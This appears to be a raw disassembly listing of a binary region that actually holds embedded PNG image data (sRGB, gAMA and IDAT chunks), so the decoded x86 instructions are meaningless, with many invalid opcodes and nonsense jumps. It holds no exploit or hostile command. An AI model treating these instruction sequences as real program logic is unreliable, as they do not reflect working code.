  4046b8:	00 01                	add    %al,(%ecx)
  4046ba:	73 52                	jae    0x40470e
  4046bc:	47                   	inc    %edi
  4046bd:	42                   	inc    %edx
  4046be:	00 ae ce 1c e9 00    	add    %ch,0xe91cce(%esi)
  4046c4:	00 00                	add    %al,(%eax)
  4046c6:	04 67                	add    $0x67,%al
  4046c8:	41                   	inc    %ecx
  4046c9:	4d                   	dec    %ebp
  4046ca:	41                   	inc    %ecx
  4046cb:	00 00                	add    %al,(%eax)
  4046cd:	b1 8f                	mov    $0x8f,%cl
  4046cf:	0b fc                	or     %esp,%edi
  4046d1:	61                   	popa
  4046d2:	05 00 00 09 c2       	add    $0xc2090000,%eax
  4046d7:	49                   	dec    %ecx
  4046d8:	44                   	inc    %esp
  4046d9:	41                   	inc    %ecx
  4046da:	54                   	push   %esp
  4046db:	78 5e                	js     0x40473b
  4046dd:	ed                   	in     (%dx),%eax
  4046de:	9d                   	popf
  4046df:	2d ac 15 47 14       	sub    $0x144715ac,%eax
  4046e4:	c7                   	(bad)
  4046e5:	4f                   	dec    %edi
  4046e6:	9a 34 41 20 48 10 08 	lcall  $0x810,$0x48204134
  4046ed:	0c a2                	or     $0xa2,%al
  4046ef:	a2 06 85 ab a8       	mov    %al,0xa8ab8506
  4046f4:	aa                   	stos   %al,%es:(%edi)
  4046f5:	40                   	inc    %eax
  4046f6:	54                   	push   %esp
  4046f7:	54                   	push   %esp
  4046f8:	a2 51 75 24 18       	mov    %al,0x18247551
  4046fd:	14 0e                	adc    $0xe,%al
  4046ff:	57                   	push   %edi
  404700:	83 c3 3c             	add    $0x3c,%ebx
  404703:	f3 04 0a             	repz add $0xa,%al
  404706:	83 c1 3d             	add    $0x3d,%ecx
  404709:	85 40 54             	test   %eax,0x54(%eax)
  40470c:	d5 55                	aad    $0x55
  40470e:	34 a9                	xor    $0xa9,%al
  404710:	40                   	inc    %eax
  404711:	34 a9                	xor    $0xa9,%al
  404713:	68 d2 a6 21 21       	push   $0x2121a6d2
  404718:	4d                   	dec    %ebp
  404719:	9a 69 fe e5 6c de e5 	lcall  $0xe5de,$0x6ce5fe69
  404720:	30 bb 3b 5f 67 be    	xor    %bh,-0x4198a0c5(%ebx)
  404726:	f6 fc                	idiv   %ah
  404728:	93                   	xchg   %eax,%ebx
  404729:	5f                   	pop    %edi
  40472a:	d2 84 be 3b 7b 77 e7 	rolb   %cl,-0x188884c5(%esi,%edi,4)
  404731:	ce                   	into
  404732:	9e                   	sahf
  404733:	39 5f 43             	cmp    %ebx,0x43(%edi)
  404736:	64 5a                	fs pop %edx
  404738:	95                   	xchg   %eax,%ebp
  404739:	23 ba e3 88 9e 3a    	and    0x3a9e88e3(%edx),%edi
  40473f:	a2 37 8e e8 0f       	mov    %al,0xfe88e37
  404744:	47                   	inc    %edi
  404745:	f4                   	hlt
  404746:	bb 23 fa d5 11       	mov    $0x11d5fa23,%ebx
  40474b:	9d                   	popf
  40474c:	3b a2 ef 1c d1 e7    	cmp    -0x182ee311(%edx),%esp
  404752:	f2 6f                	repnz outsl %ds:(%esi),(%dx)
  404754:	4c                   	dec    %esp
  404755:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404756:	55                   	push   %ebp
  404757:	39 a2 af 1c d1 4f    	cmp    %esp,0x4fd11caf(%edx)
  40475d:	8e e8                	mov    %eax,%gs
  40475f:	5f                   	pop    %edi
  404760:	47                   	inc    %edi
  404761:	e4 36                	in     $0x36,%al
  404763:	f8                   	clc
  404764:	19 13                	sbb    %edx,(%ebx)
  404766:	4c                   	dec    %esp
  404767:	fe                   	(bad)
  404768:	bd c9 f4 91 1c       	mov    $0x1c91f4c9,%ebp
  40476d:	d1 75 47             	shll   $1,0x47(%ebp)
  404770:	74 e6                	je     0x404758
  404772:	88 fe                	mov    %bh,%dh
  404774:	f1                   	int1
  404775:	4c                   	dec    %esp
  404776:	a2 2d b0 a2 dd       	mov    %al,0xdda2b02d
  40477b:	91                   	xchg   %eax,%ecx
  40477c:	9f                   	lahf
  40477d:	67 32 61 52          	xor    0x52(%bx,%di),%ah
  404781:	5d                   	pop    %ebp
  404782:	e3 55                	jecxz  0x4047d9
  404784:	4a                   	dec    %edx
  404785:	4e                   	dec    %esi
  404786:	9a 50 fe 72 44 df ca 	lcall  $0xcadf,$0x4472fe50
  40478d:	cf                   	iret
  40478e:	35 1d 58 fc ea       	xor    $0xeafc581d,%eax
  404793:	fb                   	sti
  404794:	c5 33                	lds    (%ebx),%esi
  404796:	59                   	pop    %ecx
  404797:	62 c1 ab             	(bad) {rz-bad},{%k3}{z}
  40479a:	f3 be fc 7c d3 01    	repz mov $0x1d37cfc,%esi
  4047a0:	e5 88                	in     $0x88,%eax
  4047a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4047a3:	f3 6a 23             	repz push $0x23
  4047a6:	27                   	daa
  4047a7:	49                   	dec    %ecx
  4047a8:	2a ef                	sub    %bh,%ch
  4047aa:	1d d1 5d 39 8e       	sbb    $0x8e395dd1,%eax
  4047af:	e9 40 c2 ae 8e       	jmp    0x8eef09f4
  4047b4:	ed                   	in     (%dx),%eax
  4047b5:	23 39                	and    (%ecx),%edi
  4047b7:	39 72 c1             	cmp    %esi,-0x3f(%edx)
  4047ba:	ee                   	out    %al,(%dx)
  4047bb:	f1                   	int1
  4047bc:	0b 39                	or     (%ecx),%edi
  4047be:	9e                   	sahf
  4047bf:	e9 00 e2 49 05       	jmp    0x58a29c4
  4047c4:	b7 81                	mov    $0x81,%bh
  4047c6:	9c                   	pushf
  4047c7:	14 a5                	adc    $0xa5,%al
  4047c9:	c0 8e f1 ba 1c d7 34 	rorb   $0x34,-0x28e3450f(%esi)
  4047d0:	b9 1c d1 bd 00       	mov    $0xbdd11c,%ecx
  4047d5:	77 42                	ja     0x404819
  4047d7:	2e 3f                	cs aas
  4047d9:	c8 71 4d 13          	enter  $0x4d71,$0x13
  4047dd:	cb                   	lret
  4047de:	11 5d e5             	adc    %ebx,-0x1b(%ebp)
  4047e1:	15 45 4e 84 d2       	adc    $0xd2844e45,%eax
  4047e6:	c0 76 fb 52          	shlb   $0x52,-0x5(%esi)
  4047ea:	8e 6f 9a             	mov    -0x66(%edi),%gs
  4047ed:	54                   	push   %esp
  4047ee:	8e e8                	mov    %eax,%gs
  4047f0:	89 67 12             	mov    %esp,0x12(%edi)
  4047f3:	68 f1 da 11 7d       	push   $0x7d11daf1
  4047f8:	26 af                	es scas %es:(%edi),%eax
  4047fa:	c1 34 99 60          	shll   $0x60,(%ecx,%ebx,4)
  4047fe:	54                   	push   %esp
  4047ff:	17                   	pop    %ss
  404800:	de 05 ee 81 d7 ad    	fiadds 0xadd781ee
  404806:	ed                   	in     (%dx),%eax
  404807:	12 67 16             	adc    0x16(%edi),%ah
  40480a:	1b ec                	sbb    %esp,%ebp
  40480c:	17                   	pop    %ss
  40480d:	9e                   	sahf
  40480e:	87 af 0d 76 9e 16    	xchg   %ebp,0x169e760d(%edi)
  404814:	57                   	push   %edi
  404815:	9c                   	pushf
  404816:	55                   	push   %ebp
  404817:	95                   	xchg   %eax,%ebp
  404818:	0c 76                	or     $0x76,%al
  40481a:	1f                   	pop    %ds
  40481b:	18 f3                	sbb    %dh,%bl
  40481d:	7b 79                	jnp    0x404898
  40481f:	3d a6 09 e4 88       	cmp    $0x88e409a6,%eax
  404824:	ae                   	scas   %es:(%edi),%al
  404825:	64 86 6c 72 41       	xchg   %ch,%fs:0x41(%edx,%esi,2)
  40482a:	76 84                	jbe    0x4047b0
  40482c:	19 f2                	sbb    %esi,%edx
  40482e:	b3 c9                	mov    $0xc9,%bl
  404830:	11 3d f2 3c ec da    	adc    %edi,0xdaec3cf2
  404836:	98                   	cwtl
  404837:	21 3f                	and    %edi,(%edi)
  404839:	93                   	xchg   %eax,%ebx
  40483a:	1c d1                	sbb    $0xd1,%al
  40483c:	0d 5e 31 e4 83       	or     $0x83e4315e,%eax
  404841:	ae                   	scas   %es:(%edi),%al
  404842:	0d 5e 89 df c8       	or     $0xc8df895e,%eax
  404847:	eb 33                	jmp    0x40487c
  404849:	0d 2a 4e d6 93       	or     $0x93d64e2a,%eax
  40484e:	0f b9 15 58 b5 cc 90 	ud1    0x90ccb558,%edx
  404855:	1f                   	pop    %ds
  404856:	5d                   	pop    %ebp
  404857:	ec                   	in     (%dx),%al
  404858:	5e                   	pop    %esi
  404859:	f8                   	clc
  40485a:	db f3                	fcomi  %st(3),%st
  40485c:	80 5b 61 19          	sbbb   $0x19,0x61(%ebx)
  404860:	10 a3 8b 0d f6 16    	adc    %ah,0x16f60d8b(%ebx)
  404866:	ee                   	out    %al,(%dx)
  404867:	85 3d 10 a4 be 29    	test   %edi,0x29bea410
  40486d:	af                   	scas   %es:(%edi),%eax
  40486e:	d7                   	xlat   %ds:(%ebx)
  40486f:	34 88                	xor    $0x88,%al
  404871:	1c d1                	sbb    $0xd1,%al
  404873:	c3                   	ret
  404874:	46                   	inc    %esi
  404875:	ee                   	out    %al,(%dx)
  404876:	85 10                	test   %edx,(%eax)
  404878:	2c 8e                	sub    $0x8e,%al
  40487a:	38 a2 38 cd 18 2b    	cmp    %ah,0x2b18cd38(%edx)
  404880:	83 7c a0 bd 80       	cmpl   $0xffffff80,-0x43(%eax,%eiz,4)
  404885:	6b bb 21 af db d4 b9 	imul   $0xffffffb9,-0x2b2450df(%ebx),%edi
  40488c:	2a c7                	sub    %bh,%al
  40488e:	03 53 79             	add    0x79(%ebx),%edx
  404891:	6e                   	outsb  %ds:(%esi),(%dx)
  404892:	ee                   	out    %al,(%dx)
  404893:	87 81 04 fb c5 11    	xchg   %eax,0x11c5fb04(%ecx)
  404899:	fd                   	std
  40489a:	e9 79 90 bd 81       	jmp    0x81fdd918
  40489f:	d7                   	xlat   %ds:(%ebx)
  4048a0:	f4                   	hlt
  4048a1:	3d 79 fd a6 0e       	cmp    $0xea6fd79,%eax
  4048a6:	c5 f1 c0             	(bad)
  4048a9:	97                   	xchg   %eax,%edi
  4048aa:	9e                   	sahf
  4048ab:	87 d8                	xchg   %ebx,%eax
  4048ad:	2b 6f ed             	sub    -0x13(%edi),%ebp
  4048b0:	95                   	xchg   %eax,%ebp
  4048b1:	38 80 90 49 d0 b1    	cmp    %al,-0x4e2fb670(%eax)
  4048b7:	c1 be c6 13 f9 3d 4c 	sarl   $0x4c,0x3df913c6(%esi)
  4048be:	9d                   	popf
  4048bf:	c9                   	leave
  4048c0:	11 bd f2 3c b8 de    	adc    %edi,-0x2147c30e(%ebp)
  4048c6:	f9                   	stc
  4048c7:	cd d2                	int    $0xd2
  4048c9:	98                   	cwtl
  4048ca:	3b 16                	cmp    (%esi),%edx
  4048cc:	67 2f                	addr16 das
  4048ce:	c4 16                	les    (%esi),%edx
  4048d0:	9b                   	fwait
  4048d1:	f6 02 0a             	testb  $0xa,(%edx)
  4048d4:	65 cd 90             	gs int $0x90
  4048d7:	ef                   	out    %eax,(%dx)
  4048d8:	4d                   	dec    %ebp
  4048d9:	1c 0f                	sbb    $0xf,%al
  4048db:	84 bd 22 1f d8 28    	test   %bh,0x28d81f22(%ebp)
  4048e1:	e0 07                	loopne 0x4048ea
  4048e3:	f1                   	int1
  4048e4:	b5 fc                	mov    $0xfc,%ch
  4048e6:	5e                   	pop    %esi
  4048e7:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4048e8:	86 c2                	xchg   %al,%dl
  4048ea:	2f                   	das
  4048eb:	9d                   	popf
  4048ec:	b7 ee                	mov    $0xee,%bh
  4048ee:	f2 61                	repnz popa
  4048f0:	8d 06                	lea    (%esi),%eax
  4048f2:	a2 04 b6 6a f5       	mov    %al,0xf56ab604
  4048f7:	22 64 0c 0c          	and    0xc(%esp,%ecx,1),%ah
  4048fb:	68 b0 fb 30 f7       	push   $0xf730fbb0
  404900:	43                   	inc    %ebx
  404901:	4f                   	dec    %edi
  404902:	1a cc                	sbb    %ah,%cl
  404904:	bd b0 07 aa 87       	mov    $0x87aa07b0,%ebp
  404909:	ae                   	scas   %es:(%edi),%al
  40490a:	c9                   	leave
  40490b:	ef                   	out    %eax,(%dx)
  40490c:	68 aa 2c 76 2f       	push   $0x2f762caa
  404911:	a0 ac 5d 3e a0       	mov    0xa03e5dac,%al
  404916:	91                   	xchg   %eax,%ecx
  404917:	41                   	inc    %ecx
  404918:	9a 8f bd 12 5b 89 eb 	lcall  $0xeb89,$0x5b12bd8f
  40491f:	03 4b 34             	add    0x34(%ebx),%ecx
  404922:	f3 e8 0d fc 50 ac    	repz call 0xac914535
  404928:	2d 52 2b 71 f6       	sub    $0xf6712b52,%eax
  40492d:	82 7c 28 1a 20       	cmpb   $0x20,0x1a(%eax,%ebp,1)
  404932:	9f                   	lahf
  404933:	0b 19                	or     (%ecx),%ebx
  404935:	a8 a0                	test   $0xa0,%al
  404937:	56                   	push   %esi
  404938:	6e                   	outsb  %ds:(%esi),(%dx)
  404939:	17                   	pop    %ss
  40493a:	5e                   	pop    %esi
  40493b:	ef                   	out    %eax,(%dx)
  40493c:	b6 6a                	mov    $0x6a,%dh
  40493e:	d5 16                	aad    $0x16
  404940:	67 2f                	addr16 das
  404942:	c0 b1 28 1f 48 29 90 	shlb   $0x90,0x29481f28(%ecx)
  404949:	7d 80                	jge    0x4048cb
  40494b:	57                   	push   %edi
  40494c:	12 36                	adc    (%esi),%dh
  40494e:	06                   	push   %es
  40494f:	88 3d a2 7f 16 c6    	mov    %bh,0xc6167fa2
  404955:	c4 7f a3             	les    -0x5d(%edi),%edi
  404958:	85 24 26             	test   %esp,(%esi,%eiz,1)
  40495b:	f5                   	cmc
  40495c:	8f 8a 9b 06          	(bad)
  404960:	7c ae                	jl     0x404910
  404962:	f5                   	cmc
  404963:	db aa 2d c5 ec 05    	fldt   0x5ecc52d(%edx)
  404969:	3c 50                	cmp    $0x50,%al
  40496b:	38 2b                	cmp    %ch,(%ebx)
  40496d:	77 3d                	ja     0x4049ac
  40496f:	e1 9c                	loope  0x40490d
  404971:	48                   	dec    %eax
  404972:	78 5f                	js     0x4049d3
  404974:	71 82                	jno    0x4048f8
  404976:	a3 aa e8 8a 1c       	mov    %eax,0x1c8ae8aa
  40497b:	d7                   	xlat   %ds:(%ebx)
  40497c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40497d:	24 6e                	and    $0x6e,%al
  40497f:	94                   	xchg   %eax,%esp
  404980:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404981:	f1                   	int1
  404982:	4a                   	dec    %edx
  404983:	c2 2a 85             	ret    $0x852a
  404986:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404987:	b5 51                	mov    $0x51,%ch
  404989:	af                   	scas   %es:(%edi),%eax
  40498a:	20 76 ce             	and    %dh,-0x32(%esi)
  40498d:	6a ec                	push   $0xffffffec
  40498f:	4c                   	dec    %esp
  404990:	ad                   	lods   %ds:(%esi),%eax
  404991:	1e                   	push   %ds
  404992:	b1 96                	mov    $0x96,%cl
  404994:	14 eb                	adc    $0xeb,%al
  404996:	03 df                	add    %edi,%ebx
  404998:	61                   	popa
  404999:	c2 ca f1             	ret    $0xf1ca
  40499c:	42                   	inc    %edx
  40499d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40499e:	98                   	cwtl
  40499f:	06                   	push   %es
  4049a0:	8d 2e                	lea    (%esi),%ebp
  4049a2:	cd 57                	int    $0x57
  4049a4:	e5 78                	in     $0x78,%eax
  4049a6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4049a7:	c2 c2 2f             	ret    $0x2fc2
  4049aa:	58                   	pop    %eax
  4049ab:	c1 ae c1 2e 2c bb fb 	shrl   $0xfb,-0x44d3d13f(%esi)
  4049b2:	31 db                	xor    %ebx,%ebx
  4049b4:	60                   	pusha
  4049b5:	1a 5d 6c             	sbb    0x6c(%ebp),%bl
  4049b8:	2c 8d                	sub    $0x8d,%al
  4049ba:	59                   	pop    %ecx
  4049bb:	53                   	push   %ebx
  4049bc:	ec                   	in     (%dx),%al
  4049bd:	5e                   	pop    %esi
  4049be:	c0 2f 58             	shrb   $0x58,(%edi)
  4049c1:	de f8                	fdivrp %st,%st(0)
  4049c3:	5c                   	pop    %esp
  4049c4:	8a a5 ad 70 20 5c    	mov    0x5c2070ad(%ebp),%ah
  4049ca:	7e 7e                	jle    0x404a4a
  4049cc:	2e 98                	cs cwtl
  4049ce:	f8                   	clc
  4049cf:	16                   	push   %ss
  4049d0:	47                   	inc    %edi
  4049d1:	d4 92                	aam    $0x92
  4049d3:	52                   	push   %edx
  4049d4:	71 04                	jno    0x4049da
  4049d6:	3a cf                	cmp    %bh,%cl
  4049d8:	ec                   	in     (%dx),%al
  4049d9:	1a ea                	sbb    %dl,%ch
  4049db:	a1 e2 c9 af 11       	mov    0x11afc9e2,%eax
  4049e0:	0c b7                	or     $0xb7,%al
  4049e2:	7a 44                	jp     0x404a28
  4049e4:	0d 71 7d a0 46       	or     $0x46a07d71,%eax
  4049e9:	35 f3 0b 39 56       	xor    $0x56390bf3,%eax
  4049ee:	ae                   	scas   %es:(%edi),%al
  4049ef:	1c d1                	sbb    $0xd1,%al
  4049f1:	63 cf                	arpl   %ecx,%edi
  4049f3:	38 b9 58 1c 51 43    	cmp    %bh,0x43511c58(%ecx)
  4049f9:	8e e8                	mov    %eax,%gs
  4049fb:	99                   	cltd
  4049fc:	e7 66                	out    %eax,$0x66
  4049fe:	97                   	xchg   %eax,%edi
  4049ff:	a0 f8 ae cb 11       	mov    0x11cbaef8,%al
  404a04:	dd 52 58             	fstl   0x58(%edx)
  404a07:	59                   	pop    %ecx
  404a08:	01 ec                	add    %ebp,%esp
  404a0a:	37                   	aaa
  404a0b:	73 3f                	jae    0x404a4c
  404a0d:	94                   	xchg   %eax,%esp
  404a0e:	12 3b                	adc    (%ebx),%bh
  404a10:	24 35                	and    $0x35,%al
  404a12:	dc 0b                	fmull  (%ebx)
  404a14:	a0 78 e8 84 f3       	mov    0xf384e878,%al
  404a19:	ee                   	out    %al,(%dx)
  404a1a:	35 8c 78 4c d6       	xor    $0xd64c788c,%eax
  404a1f:	c7                   	(bad)
  404a20:	72 3c                	jb     0x404a5e
  404a22:	53                   	push   %ebx
  404a23:	82 78 1b af          	cmpb   $0xaf,0x1b(%eax)
  404a27:	d1 32                	shll   $1,(%edx)
  404a29:	7b a1                	jnp    0x4049cc
  404a2b:	98                   	cwtl
  404a2c:	7d 75                	jge    0x404aa3
  404a2e:	2a c5                	sub    %ch,%al
  404a30:	14 69                	adc    $0x69,%al
  404a32:	fc                   	cld
  404a33:	c0 ac 1d 52 ae 94 dc 	shrb   $0xb,-0x236b51ae(%ebp,%ebx,1)
  404a3a:	0b 
  404a3b:	0b d8                	or     %eax,%ebx
  404a3d:	6d                   	insl   (%dx),%es:(%edi)
  404a3e:	a9 bc 5a 60 bb       	test   $0xbb605abc,%eax
  404a43:	79 c6                	jns    0x404a0b
  404a45:	2b c5                	sub    %ebp,%eax
  404a47:	53                   	push   %ebx
  404a48:	39 9e 29 42 6c ab    	cmp    %ebx,-0x5493bdd7(%esi)
  404a4e:	68 56 33 63 c2       	push   $0xc2633356
  404a53:	aa                   	stos   %al,%es:(%edi)
  404a54:	38 1f                	cmp    %bl,(%edi)
  404a56:	15 57 2c 80 9a       	adc    $0x9a802c57,%eax
  404a5b:	c9                   	leave
  404a5c:	db 72 4c             	(bad) 0x4c(%edx)
  404a5f:	53                   	push   %ebx
  404a60:	a0 2a b5 1f 2a       	mov    0x2a1fb52a,%al
  404a65:	7e 82                	jle    0x4049e9
  404a67:	04 db                	add    $0xdb,%al
  404a69:	58                   	pop    %eax
  404a6a:	08 50 cb             	or     %dl,-0x35(%eax)
  404a6d:	b1 4a                	mov    $0x4a,%cl
  404a6f:	02 2f                	add    (%edi),%ch
  404a71:	bf b9 1f 62 c5       	mov    $0xc5621fb9,%edi
  404a76:	67 dc d4             	addr16 (bad)
  404a79:	a8 66                	test   $0x66,%al
  404a7b:	2e de 08             	fimuls %cs:(%eax)
  404a7e:	8d                   	lea    (bad),%ebp
  404a7f:	ed                   	in     (%dx),%eax
  404a80:	42                   	inc    %edx
  404a81:	cd 95                	int    $0x95
  404a83:	16                   	push   %ss
  404a84:	60                   	pusha
  404a85:	b5 7d                	mov    $0x7d,%ch
  404a87:	28 c7                	sub    %al,%bh
  404a89:	36 6d                	ss insl (%dx),%es:(%edi)
  404a8b:	a8 72                	test   $0x72,%al
  404a8d:	77 63                	ja     0x404af2
  404a8f:	0d 77 03 82 d2       	or     $0xd2820377,%eax
  404a94:	5a                   	pop    %edx
  404a95:	76 e1                	jbe    0x404a78
  404a97:	29 70 ee             	sub    %esi,-0x12(%eax)
  404a9a:	de 92 e3 9b 56 54    	ficoms 0x54569be3(%edx)
  404aa0:	b9 38 a2 58 38       	mov    $0x3858a238,%ecx
  404aa5:	67 11 c2             	addr16 adc %eax,%edx
  404aa8:	2f                   	das
  404aa9:	9e                   	sahf
  404aaa:	71 b4                	jno    0x404a60
  404aac:	28 7e fd             	sub    %bh,-0x3(%esi)
  404aaf:	53                   	push   %ebx
  404ab0:	aa                   	stos   %al,%es:(%edi)
  404ab1:	f2 6a 05             	repnz push $0x5
  404ab4:	34 3c                	xor    $0x3c,%al
  404ab6:	ef                   	out    %eax,(%dx)
  404ab7:	0f 3c                	(bad)
  404ab9:	e3 68                	jecxz  0x404b23
  404abb:	81 68 44 71 3b 71 3a 	subl   $0x3a713b71,0x44(%eax)
  404ac2:	35 e8 c5 8e 14       	xor    $0x148ec5e8,%eax
  404ac7:	9c                   	pushf
  404ac8:	a8 fc                	test   $0xfc,%al
  404aca:	ab                   	stos   %eax,%es:(%edi)
  404acb:	3d 71 a2 a0 1c       	cmp    $0x1ca0a271,%eax
  404ad0:	47                   	inc    %edi
  404ad1:	13 ec                	adc    %esp,%ebp
  404ad3:	40                   	inc    %eax
  404ad4:	8b 7e 87             	mov    -0x79(%esi),%edi
  404ad7:	a9 c4 ee 05 8d       	test   $0x8d05eec4,%eax
  404adc:	00 ee                	add    %ch,%dh
  404ade:	16                   	push   %ss
  404adf:	b0 53                	mov    $0x53,%al
  404ae1:	8a f9                	mov    %cl,%bh
  404ae3:	b2 b8                	mov    $0xb8,%dl
  404ae5:	78 56                	js     0x404b3d
  404ae7:	7b 47                	jnp    0x404b30
  404ae9:	28 b1 34 e6 35 f1    	sub    %dh,-0xeca19cc(%ecx)
  404aef:	03 d1                	add    %ecx,%edx
  404af1:	74 2a                	je     0x404b1d
  404af3:	6e                   	outsb  %ds:(%esi),(%dx)
  404af4:	51                   	push   %ecx
  404af5:	cc                   	int3
  404af6:	27                   	daa
  404af7:	c4 3b                	les    (%ebx),%edi
  404af9:	42                   	inc    %edx
  404afa:	ad                   	lods   %ds:(%esi),%eax
  404afb:	f0 d3 16             	lock rcll %cl,(%esi)
  404afe:	76 ac                	jbe    0x404aac
  404b00:	8a 4f 1c             	mov    0x1c(%edi),%cl
  404b03:	0f 6c                	(bad)
  404b05:	d5 d0                	aad    $0xd0
  404b07:	a3 58 d6 00 af       	mov    %eax,0xaf00d658
  404b0c:	ba f2 f3 6b 80       	mov    $0x806bf3f2,%edx
  404b11:	55                   	push   %ebp
  404b12:	2b 3b                	sub    (%ebx),%edi
  404b14:	59                   	pop    %ecx
  404b15:	71 2a                	jno    0x404b41
  404b17:	f1                   	int1
  404b18:	6a a5                	push   $0xffffffa5
  404b1a:	91                   	xchg   %eax,%ecx
  404b1b:	33 1e                	xor    (%esi),%ebx
  404b1d:	4a                   	dec    %edx
  404b1e:	b1 0c                	mov    $0xc,%cl
  404b20:	4d                   	dec    %ebp
  404b21:	2e a0 95 9f 5f 0b    	mov    %cs:0xb5f9f95,%al
  404b27:	24 41                	and    $0x41,%al
  404b29:	5a                   	pop    %edx
  404b2a:	37                   	aaa
  404b2b:	e6 45                	out    %al,$0x45
  404b2d:	1d 34 4b bb 90       	sbb    $0x90bb4b34,%eax
  404b32:	d7                   	xlat   %ds:(%ebx)
  404b33:	94                   	xchg   %eax,%esp
  404b34:	aa                   	stos   %al,%es:(%edi)
  404b35:	ca 3b 42             	lret   $0x423b
  404b38:	1f                   	pop    %ds
  404b39:	e7 f2                	out    %eax,$0xf2
  404b3b:	9a 0e 29 ae d7 6b 5d 	lcall  $0x5d6b,$0xd7ae290e
  404b42:	cd 0c                	int    $0xc
  404b44:	2f                   	das
  404b45:	79 11                	jns    0x404b58
  404b47:	03 5e 31             	add    0x31(%esi),%ebx
  404b4a:	6f                   	outsl  %ds:(%esi),(%dx)
  404b4b:	2c 14                	sub    $0x14,%al
  404b4d:	98                   	cwtl
  404b4e:	13 c5                	adc    %ebp,%eax
  404b50:	a3 09 c3 a9 93       	mov    %eax,0x93a9c309
  404b55:	c3                   	ret
  404b56:	93                   	xchg   %eax,%ebx
  404b57:	b0 5a                	mov    $0x5a,%al
  404b59:	16                   	push   %ss
  404b5a:	f1                   	int1
  404b5b:	05 55 f6 c1 ad       	add    $0xadc1f655,%eax
  404b60:	71 ec                	jno    0x404b4e
  404b62:	76 48                	jbe    0x404bac
  404b64:	8a c5                	mov    %ch,%al
  404b66:	11 29                	adc    %ebp,(%ecx)
  404b68:	64 6f                	outsl  %fs:(%esi),(%dx)
  404b6a:	d7                   	xlat   %ds:(%ebx)
  404b6b:	d9 56 d4             	fsts   -0x2c(%esi)
  404b6e:	48                   	dec    %eax
  404b6f:	f0 8b e5             	lock mov %ebp,%esp
  404b72:	d8 ab 16 8c 66 cf    	fsubrs -0x309973ea(%ebx)
  404b78:	4d                   	dec    %ebp
  404b79:	69 45 76 68 a4 a1 ab 	imul   $0xaba1a468,0x76(%ebp),%eax
  404b80:	c1 c7 31             	rol    $0x31,%edi
  404b83:	db 21                	(bad) (%ecx)
  404b85:	71 35                	jno    0x404bbc
  404b87:	73 4f                	jae    0x404bd8
  404b89:	ed                   	in     (%dx),%eax
  404b8a:	87 5e ca             	xchg   %ebx,-0x36(%esi)
  404b8d:	6b 8c 15 32 3b 3d 9f 	imul   $0xffffffdb,-0x60c2c4ce(%ebp,%edx,1),%ecx
  404b94:	db 
  404b95:	92                   	xchg   %eax,%edx
  404b96:	07                   	pop    %es
  404b97:	f2 1a a7 16 bf 02 35 	repnz sbb 0x3502bf16(%edi),%ah
  404b9e:	aa                   	stos   %al,%es:(%edi)
  404b9f:	99                   	cltd
  404ba0:	73 c0                	jae    0x404b62
  404ba2:	2b 39                	sub    (%ecx),%edi
  404ba4:	cb                   	lret
  404ba5:	c1 a8 54 53 98 03 a2 	shrl   $0xa2,0x3985354(%eax)
  404bac:	18 2a                	sbb    %ch,(%edx)
  404bae:	a9 d7 5d 8a d3       	test   $0xd38a5dd7,%eax
  404bb3:	8d                   	lea    (bad),%esp
  404bb4:	e5 4d                	in     $0x4d,%eax
  404bb6:	68 0d 0c f8 ac       	push   $0xacf80c0d
  404bbb:	87 d0                	xchg   %edx,%eax
  404bbd:	d9 ab 7d e1 99 bc    	fldcw  -0x43661e83(%ebx)
  404bc3:	ce                   	into
  404bc4:	29 c5                	sub    %eax,%ebp
  404bc6:	ee                   	out    %al,(%dx)
  404bc7:	85 5e 0c             	test   %ebx,0xc(%esi)
  404bca:	76 49                	jbe    0x404c15
  404bcc:	56                   	push   %esi
  404bcd:	c5 8e 72 3a 72 2a    	lds    0x2a723a72(%esi),%ecx
  404bd3:	30 37                	xor    %dh,(%edi)
  404bd5:	b2 37                	mov    $0x37,%dl
  404bd7:	26 dd ab 52 ba 71 2a 	(bad) %es:0x2a71ba52(%ebx)
  404bde:	c9                   	leave
  404bdf:	a1 1d 4e f7 e9       	mov    0xe9f74e1d,%eax
  404be4:	f5                   	cmc
  404be5:	07                   	pop    %es
  404be6:	33 77 63             	xor    0x63(%edi),%esi
  404be9:	11 8e a3 a1 ab 8b    	adc    %ecx,-0x74545e5d(%esi)
  404bef:	fc                   	cld
  404bf0:	e2 bd                	loop   0x404baf
  404bf2:	f0 48                	lock dec %eax
  404bf4:	5e                   	pop    %esi
  404bf5:	73 a8                	jae    0x404b9f
  404bf7:	d8 6e 6c             	fsubrs 0x6c(%esi)
  404bfa:	15 eb 0c 61 de       	adc    $0xde610ceb,%eax
  404bff:	53                   	push   %ebx
  404c00:	5d                   	pop    %ebp
  404c01:	1b e4                	sbb    %esp,%esp
  404c03:	29 c5                	sub    %eax,%ebp
  404c05:	72 26                	jb     0x404c2d
  404c07:	af                   	scas   %es:(%edi),%eax
  404c08:	39 54 1d ee          	cmp    %edx,-0x12(%ebp,%ebx,1)
  404c0c:	08 25 88 6e cc b7    	or     %ah,0xb7cc6e88
  404c12:	6a 71                	push   $0x71
  404c14:	71 44                	jno    0x404c5a
  404c16:	4f                   	dec    %edi
  404c17:	ee                   	out    %al,(%dx)
  404c18:	05 1f af e5 75       	add    $0x75e5af1f,%eax
  404c1d:	87 aa 71 f0 39 94    	xchg   %ebp,-0x6bc60f8f(%edx)
  404c23:	6c                   	insb   (%dx),%es:(%edi)
  404c24:	5f                   	pop    %edi
  404c25:	5d                   	pop    %ebp
  404c26:	57                   	push   %edi
  404c27:	e2 d7                	loop   0x404c00
  404c29:	84 66 35             	test   %ah,0x35(%esi)
  404c2c:	73 29                	jae    0x404c57
  404c2e:	b0 3d                	mov    $0x3d,%al
  404c30:	4f                   	dec    %edi
  404c31:	72 39                	jb     0x404c6c
  404c33:	74 10                	je     0x404c45
  404c35:	7c 0e                	jl     0x404c45
  404c37:	01 66 48             	add    %esp,0x48(%esi)
  404c3a:	b1 dc                	mov    $0xdc,%cl
  404c3c:	b3 e6                	mov    $0xe6,%bl
  404c3e:	52                   	push   %edx
  404c3f:	ea be a2 41 72 01 6b 	ljmp   $0x6b01,$0x7241a2be
